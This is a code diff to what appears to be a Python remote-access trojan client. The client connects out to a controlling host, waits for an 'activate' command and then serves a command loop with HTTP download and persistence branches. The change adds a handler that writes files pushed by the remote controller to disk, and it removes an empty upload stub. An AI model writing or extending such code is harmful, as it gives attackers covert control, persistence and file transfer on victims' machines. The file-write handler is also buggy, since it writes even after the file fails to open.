@@ -16,6 +16,7 @@ active = False
 sock = None
 ret = ''
 
+# ⬆️ ul file
 def Upload(sock, file):
   try:
     f = open(file, 'rb')
@@ -78,16 +79,27 @@ while True:
   try:
     sock = socket.socket(AF_INET, SOCK_STREAM)
     sock.connect((HOST, PORT))
-
-    data = Receive(sock).decode()
-
-    if data == 'activate':
+    if Receive(sock).decode() == 'activate':
       active = True
       Send(sock, os.getcwd() + '>')
 
     while active:
-      ret = ''
-      data = Receive(sock).decode()
+      data = Receive(sock)
+
+      # ⬇️ dl file
+      if data.endswith(b'FILEXXX'):
+        data = data[:-7].split(b'FILENAMEXXX')
+        d = b''.join(data[:-1])
+        fn = data[-1].decode() # to str
+        try:
+          f = open(fn, 'wb')
+        except IOError:
+          print('Error opening file ⚠️')
+        f.write(d)
+        f.close()
+        continue # recv more
+      else:
+        data = data.decode()
 
       if data == 'deactivate':
         active = False
@@ -99,10 +111,6 @@ while True:
 
       elif data.startswith('dlhttp '):
         ret = Downhttp(sock, data[9:])
-
-      elif data.startswith('ul '):
-        # TODO
-        pass
 
       elif data.startswith('persist '):
         # Attempt persistence
